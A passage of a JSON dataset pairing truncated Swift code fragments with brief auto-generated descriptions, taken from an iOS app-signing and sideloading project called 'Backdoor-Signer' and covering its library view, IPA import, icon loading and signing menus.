    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2295",
    "code": "func configure(with app: NSManagedObject, filePath: URL) {\nvar appName = \"\"\nif let name = app.value(forKey: \"name\") as? String {",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2296",
    "code": "func getValue<T>(forKey key: String, from app: NSManagedObject) -> T? {\nguard let attributeType = app.entity.attributesByName[key]?.attributeType else {",
    "nl": "Function getValue - retrieves value",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2297",
    "code": "class BadgeView: UIView {\nprivate let badgeLabel = UILabel()\n\noverride init(frame: CGRect) {",
    "nl": "class BadgeView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2298",
    "code": "private func setupView() {\nbadgeLabel.text = \"BETA\"\nbadgeLabel.textColor = .label\nbadgeLabel.textAlignment = .center\nbadgeLabel.backgroundColor = .systemYellow.withAlphaComponent(0.2)\nbadgeLabel.font = .boldSystemFont(ofSize: 12)\n\nbadgeLabel.translatesAutoresizingMaskIntoConstraints = false\naddSubview(badgeLabel)\n",
    "nl": "Function setupView - sets upview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2299",
    "code": "extension LibraryViewController {\n// MARK: - Icon Loading with LED Effects\n\n/// Enhanced icon loading for app cells with LED effects\n/// - Parameters:\n///   - cell: The cell to configure\n///   - app: The app object containing icon information\n///   - filePath: The path to the app's files\nfunc loadEnhancedIcon(for cell: AppsTableViewCell, with app: NSManagedObject, filePath: URL) {",
    "nl": "/ Extension to fix icon display issues in LibraryViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift",
    "code_type": "extension"
  },
  {
    "id": "2300",
    "code": "func loadEnhancedIcon(for cell: AppsTableViewCell, with app: NSManagedObject, filePath: URL) {\n// Start with a loading placeholder\nif let defaultImage = UIImage(named: \"unknown\") {",
    "nl": "MARK: - Icon Loading with LED Effects / Enhanced icon loading for app cells with LED effects / - Parameters: /   - cell: The cell to configure /   - app: The app object containing icon information /   - filePath: The path to the app's files",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift",
    "code_type": "function"
  },
  {
    "id": "2301",
    "code": "private func tryLoadingIconWithFallbacks(cell: AppsTableViewCell,\nimagePath: URL,\napp: NSManagedObject,\nfilePath: URL)\n{",
    "nl": "/ Try multiple methods to load the app icon / - Parameters: /   - cell: The cell to configure /   - imagePath: Path to the icon /   - app: The app object /   - filePath: Path to the app's files",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift",
    "code_type": "function"
  },
  {
    "id": "2302",
    "code": "private func extractIconFromInfoPlist(cell: AppsTableViewCell, app: NSManagedObject, appPath: URL) {\n// Find the app's Info.plist\nlet infoPlistPath = appPath.appendingPathComponent(\"Info.plist\")\n\nguard FileManager.default.fileExists(atPath: infoPlistPath.path),\nlet infoPlist = NSDictionary(contentsOf: infoPlistPath)\nelse {",
    "nl": "/ Extract icon information from the app's Info.plist / - Parameters: /   - cell: The cell to configure /   - app: The app object /   - appPath: Path to the app bundle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift",
    "code_type": "function"
  },
  {
    "id": "2303",
    "code": "private func setImageWithLEDEffect(cell: AppsTableViewCell, image: UIImage, defaultEffect: Bool = false) {\n// Remove any existing animations\ncell.imageView?.layer.removeAllAnimations()\n\n// Set the image\nSectionIcons.sectionImage(to: cell, with: image)\n\n// Apply appropriate LED effect\nDispatchQueue.main.async {",
    "nl": "/ Set the image with an LED effect for better visibility / - Parameters: /   - cell: The cell to configure /   - image: The image to display /   - defaultEffect: Whether to apply special effect for default images",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift",
    "code_type": "function"
  },
  {
    "id": "2304",
    "code": "func addImportSourceLabel(to cell: AppsTableViewCell, sourceLocation: String?) {\n// Remove any existing label first\nif let existingLabel = cell.contentView.viewWithTag(9876) {",
    "nl": "MARK: - Import Label Enhancement / Add an import label indicator to show app source / - Parameters: /   - cell: The cell to configure /   - sourceLocation: The source location string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift",
    "code_type": "function"
  },
  {
    "id": "2305",
    "code": "extension LibraryViewController: UIDocumentPickerDelegate {\nfunc startImporting() {",
    "nl": "extension LibraryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "extension"
  },
  {
    "id": "2306",
    "code": "func startImporting() {\nlet actionSheet = UIAlertController(title: nil, message: nil, preferredStyle: .actionSheet)\n\nlet documentPickerAction = UIAlertAction(\ntitle: String.localized(\"LIBRARY_VIEW_CONTROLLER_IMPORT_ACTION_SHEET_FILE\"),\nstyle: .default\n) { [weak self] _ in",
    "nl": "Function startImporting - implements startimporting functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2307",
    "code": "func downloadFileFromUrl() {\nlet alert = UIAlertController(\ntitle: String.localized(\"LIBRARY_VIEW_CONTROLLER_IMPORT_ACTION_SHEET_URL\"),\nmessage: nil,\npreferredStyle: .alert\n)\n\nalert.addTextField { textField in",
    "nl": "Function downloadFileFromUrl - implements downloadfilefromurl functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2308",
    "code": "@objc func textURLDidChange(_ textField: UITextField) {\nguard let alertController = presentedViewController as? UIAlertController,\nlet setAction = alertController.actions.first(where: { [weak self] action in",
    "nl": "Function textURLDidChange - implements texturldidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2309",
    "code": "func isValidURL(_ url: String) -> Bool {\nlet urlPredicate = NSPredicate(format: \"SELF MATCHES %@\", \"https://.+\")\nreturn urlPredicate.evaluate(with: url)\n}\n\n//\n\nfunc presentDocumentPicker(fileExtension: [UTType]) {",
    "nl": "Function isValidURL - checks if validurl",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2310",
    "code": "func presentDocumentPicker(fileExtension: [UTType]) {\nlet documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)\ndocumentPicker.delegate = self\ndocumentPicker.allowsMultipleSelection = false\npresent(documentPicker, animated: true, completion: nil)\n}\n\nfunc documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {",
    "nl": "Function presentDocumentPicker - implements presentdocumentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2311",
    "code": "func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\nguard let selectedFileURL = urls.first else { return }",
    "nl": "Function documentPicker - implements documentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2312",
    "code": "func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {\ncontroller.dismiss(animated: true, completion: nil)\n}\n}\n\nextension LibraryViewController {",
    "nl": "Function documentPickerWasCancelled - implements documentpickerwascancelled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2313",
    "code": "extension LibraryViewController {\nstatic var appDownload: AppDownload?\nfunc startDownloadIfNeeded(downloadURL: URL?, sourceLocation: String) {",
    "nl": "extension LibraryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "extension"
  },
  {
    "id": "2314",
    "code": "func startDownloadIfNeeded(downloadURL: URL?, sourceLocation: String) {\nguard let downloadURL = downloadURL else {",
    "nl": "Function startDownloadIfNeeded - implements startdownloadifneeded functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2315",
    "code": "extension LibraryViewController {\n@objc func startInstallProcess(app: NSManagedObject, filePath: String) {",
    "nl": "extension LibraryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "extension"
  },
  {
    "id": "2316",
    "code": "@objc func startInstallProcess(app: NSManagedObject, filePath: String) {\nguard !filePath.isEmpty else {",
    "nl": "Function startInstallProcess - implements startinstallprocess functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2317",
    "code": "@objc func shareFile(app: NSManagedObject, filePath: String) {\nguard !filePath.isEmpty else {",
    "nl": "Function shareFile - implements sharefile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2318",
    "code": "@objc func startInstallProcess(meow: NSManagedObject, filePath: String) {\nstartInstallProcess(app: meow, filePath: filePath)\n}\n\n@objc func shareFile(meow: NSManagedObject, filePath: String) {",
    "nl": "MARK: - Legacy methods for backward compatibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2319",
    "code": "@objc func shareFile(meow: NSManagedObject, filePath: String) {\nshareFile(app: meow, filePath: filePath)\n}\n\nfunc presentTransferPreview(\nwith appPath: String,\nisSharing: Bool = false,\nid: String,\nversion: String,\nname: String",
    "nl": "Function shareFile - implements sharefile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2320",
    "code": "func presentTransferPreview(\nwith appPath: String,\nisSharing: Bool = false,\nid: String,\nversion: String,\nname: String\n) {",
    "nl": "Function presentTransferPreview - implements presenttransferpreview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift",
    "code_type": "function"
  },
  {
    "id": "2321",
    "code": "extension LibraryViewController {\n/// Enhanced implementation of handleIPAFile to correctly store app files\n/// - Parameters:\n///   - destinationURL: The URL of the IPA file to process\n///   - uuid: Unique identifier for the file\n///   - dl: AppDownload instance to use for processing\n/// - Throws: Any error encountered during file processing\nfunc handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {",
    "nl": "Extension to fix file import location and structure issues",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift",
    "code_type": "extension"
  },
  {
    "id": "2322",
    "code": "func handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {\n// Create semaphore for synchronous processing\nlet semaphore = DispatchSemaphore(value: 0)\nvar functionError: Error?\n\n// Log the operation\nbackdoor.Debug.shared.log(message: \"Processing IPA file: \\(destinationURL.lastPathComponent)\", type: .info)\n\n// Import and process the IPA file\nDispatchQueue(label: \"AppImport\").async {",
    "nl": "/ Enhanced implementation of handleIPAFile to correctly store app files / - Parameters: /   - destinationURL: The URL of the IPA file to process /   - uuid: Unique identifier for the file /   - dl: AppDownload instance to use for processing / - Throws: Any error encountered during file processing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift",
    "code_type": "function"
  },
  {
    "id": "2323",
    "code": "private func showImportErrorAlert(message: String) {\nlet alert = UIAlertController(\ntitle: \"Import Failed\",\nmessage: message,\npreferredStyle: .alert\n)\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\npresent(alert, animated: true)\n}\n",
    "nl": "/ Show an error alert for import failures / - Parameter message: The error message to display",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift",
    "code_type": "function"
  },
  {
    "id": "2324",
    "code": "func applyImportFixes() {\n// Hook into the document picker delegate method\n// This is done at runtime using method swizzling\nSelf.swizzleMethods(\noriginalClass: LibraryViewController.self,\noriginalSelector: #selector(documentPicker(_:didPickDocumentsAt:)),\nswizzledClass: LibraryViewController.self,\nswizzledSelector: #selector(fixedDocumentPicker(_:didPickDocumentsAt:))\n)\n",
    "nl": "/ Applies all import-related fixes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift",
    "code_type": "function"
  },
  {
    "id": "2325",
    "code": "@objc func fixedDocumentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\nguard let selectedFileURL = urls.first else { return }",
    "nl": "/ Fixed implementation of document picker delegate method",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift",
    "code_type": "function"
  },
  {
    "id": "2326",
    "code": "private static func swizzleMethods(\noriginalClass: AnyClass,\noriginalSelector: Selector,\nswizzledClass: AnyClass,\nswizzledSelector: Selector\n) {",
    "nl": "MARK: - Swizzling Helper / Helper method to swizzle methods at runtime",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift",
    "code_type": "function"
  },
  {
    "id": "2327",
    "code": "extension LibraryViewController {\n/// Configures popup detents for proper height based on content - implementation moved to main class\n\n/// Fixed method to handle signing a downloaded app - ensures sign popup works correctly\n/// - Parameter app: The app to sign\nfunc startSigning(app: NSManagedObject) {",
    "nl": "Extension to fix popup presentation in LibraryViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+PopupFix.swift",
    "code_type": "extension"
  },
  {
    "id": "2328",
    "code": "func startSigning(app: NSManagedObject) {\n// Ensure we have a valid DownloadedApps object\nguard let downloadedApp = app as? DownloadedApps else {",
    "nl": "/ Configures popup detents for proper height based on content - implementation moved to main class / Fixed method to handle signing a downloaded app - ensures sign popup works correctly / - Parameter app: The app to sign",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+PopupFix.swift",
    "code_type": "function"
  },
  {
    "id": "2329",
    "code": "struct SourceAppVersion {\nlet version: String\nlet downloadURL: URL\n\n// Add any other properties that might be needed based on usage in the code\n\n// Initializer from StoreAppsDataVersion (if this type exists in the codebase)\ninit(from storeVersion: Any) {",
    "nl": "/ Source application version representation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Types.swift",
    "code_type": "struct"
  },
  {
    "id": "2330",
    "code": "class LibraryViewController: UITableViewController {\n// MARK: - Properties\n\nvar signedApps: [SignedApps]?\nvar downloadedApps: [DownloadedApps]?\n\nvar filteredSignedApps: [SignedApps] = []\nvar filteredDownloadedApps: [DownloadedApps] = []\n\nvar installer: Installer?",
    "nl": "class LibraryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2331",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nsetupSearchController()\nfetchSources()\nloaderAlert = presentLoader()\n}\n\noverride func viewWillAppear(_ animated: Bool) {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2332",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\nsetupNavigation()\n}\n\ndeinit {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2333",
    "code": "private func setupViews() {\ntableView.dataSource = self\ntableView.delegate = self\ntableView.register(AppsTableViewCell.self, forCellReuseIdentifier: \"RoundedBackgroundCell\")\n\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(refreshData),\nname: Notification.Name(\"lfetch\"),\nobject: nil",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2334",
    "code": "@objc private func handleInstallNotification(_ notification: Notification) {\nguard let downloadedApp = notification.userInfo?[\"downloadedApp\"] as? DownloadedApps else {",
    "nl": "Function handleInstallNotification - implements handleinstallnotification functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2335",
    "code": "private func setupNavigation() {\nnavigationController?.navigationBar.prefersLargeTitles = true\ntitle = String.localized(\"TAB_LIBRARY\")\n}\n\n// MARK: - Data Management\n\n@objc func refreshData() {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2336",
    "code": "@objc func refreshData() {\nfetchSources()\n}\n\nfunc fetchSources() {",
    "nl": "MARK: - Data Management",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2337",
    "code": "func fetchSources() {\nsignedApps = CoreDataManager.shared.getDatedSignedApps()\ndownloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\n\nDispatchQueue.main.async {",
    "nl": "Function fetchSources - implements fetchsources functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2338",
    "code": "private func handleAppUpdate(for signedApp: SignedApps) {\nguard let sourceURL = signedApp.originalSourceURL else {",
    "nl": "MARK: - App Update Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2339",
    "code": "private func fetchDebugModeUpdate(for signedApp: SignedApps) {\nlet mockSource = SourceRefreshOperation()\nmockSource.createMockSource { [weak self] mockSourceData in",
    "nl": "Function fetchDebugModeUpdate - implements fetchdebugmodeupdate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2340",
    "code": "private func fetchProductionUpdate(from sourceURL: URL, for signedApp: SignedApps) {\nSourceGET().downloadURL(from: sourceURL) { [weak self] result in",
    "nl": "Function fetchProductionUpdate - implements fetchproductionupdate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2341",
    "code": "private func handleSourceData(_ sourceData: SourcesData, for signedApp: SignedApps) {\nguard let bundleId = signedApp.bundleidentifier,\nlet updateVersion = signedApp.updateVersion,\nlet app = sourceData.apps.first(where: { $0.bundleIdentifier == bundleId }),",
    "nl": "Function handleSourceData - implements handlesourcedata functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2342",
    "code": "private func downloadAndProcessUpdate(version: SourceAppVersion, originalApp: SignedApps) {\nlet uuid = UUID().uuidString\n\nDispatchQueue.global(qos: .background).async { [weak self] in",
    "nl": "Function downloadAndProcessUpdate - implements downloadandprocessupdate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2343",
    "code": "private func prepareAndSignDownloadedUpdate(uuid: String, originalApp: SignedApps) {\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\nguard let downloadedApp = downloadedApps.first(where: { $0.uuid == uuid }) else {",
    "nl": "Function prepareAndSignDownloadedUpdate - implements prepareandsigndownloadedupdate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2344",
    "code": "func getApplicationFilePath(with _: NSManagedObject?,\nrow: Int,\nsection: Int,\ngetuuidonly: Bool = false) -> URL?\n{",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2345",
    "code": "func getApplication(row: Int, section: Int) -> NSManagedObject? {\nswitch section {",
    "nl": "Function getApplication - retrieves application",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2346",
    "code": "extension LibraryViewController {\noverride func numberOfSections(in _: UITableView) -> Int {",
    "nl": "MARK: - UITableView DataSource & Delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2347",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 2\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2348",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2349",
    "code": "override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2350",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = AppsTableViewCell(style: .subtitle, reuseIdentifier: \"RoundedBackgroundCell\")\ncell.selectionStyle = .default\ncell.accessoryType = .disclosureIndicator\ncell.backgroundColor = .clear\n\nguard let source = getApplication(row: indexPath.row, section: indexPath.section),\nlet filePath = getApplicationFilePath(\nwith: source,\nrow: indexPath.row,",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2351",
    "code": "private func configureCell(_ cell: AppsTableViewCell, with app: NSManagedObject, filePath: URL) {\nif let iconURL = app.value(forKey: \"iconURL\") as? String {",
    "nl": "Function configureCell - implements configurecell functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2352",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nguard let app = getApplication(row: indexPath.row, section: indexPath.section),\nlet fullPath = getApplicationFilePath(\nwith: app,\nrow: indexPath.row,\nsection: indexPath.section,\ngetuuidonly: false\n)\nelse {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2353",
    "code": "private func handleSignedAppAction(\napp: NSManagedObject,\nuuidPath: URL?,\nfullPath: URL,\nappName: String,\nindexPath: IndexPath\n) {",
    "nl": "Function handleSignedAppAction - implements handlesignedappaction functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2354",
    "code": "private func configureUpdateMenuButtons(\nfor signedApp: SignedApps,\nappName: String,\nindexPath: IndexPath\n) {",
    "nl": "Function configureUpdateMenuButtons - implements configureupdatemenubuttons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2355",
    "code": "private func configureRegularMenuButtons(\nfor app: NSManagedObject,\nuuidPath: URL?,\nfullPath: URL,\nappName: String,\nindexPath: IndexPath\n) {",
    "nl": "Function configureRegularMenuButtons - implements configureregularmenubuttons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2356",
    "code": "private func handleResignApp(app: NSManagedObject, fullPath: URL, indexPath: IndexPath) {\nguard let signedApp = app as? SignedApps else { return }",
    "nl": "Function handleResignApp - implements handleresignapp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2357",
    "code": "private func showNoCertificatesAlert() {\nlet alert = UIAlertController(\ntitle: String.localized(\"APP_SIGNING_VIEW_CONTROLLER_NO_CERTS_ALERT_TITLE\"),\nmessage: String.localized(\"APP_SIGNING_VIEW_CONTROLLER_NO_CERTS_ALERT_DESCRIPTION\"),\npreferredStyle: .alert\n)\nalert.addAction(UIAlertAction(title: String.localized(\"LAME\"), style: .default))\npresent(alert, animated: true)\n}\n",
    "nl": "Function showNoCertificatesAlert - implements shownocertificatesalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2358",
    "code": "private func handleDownloadedAppAction(\napp: NSManagedObject,\nuuidPath: URL?,\nappName: String\n) {",
    "nl": "Function handleDownloadedAppAction - implements handledownloadedappaction functionality",
    "language": "swift",
    "folder": "iOS",
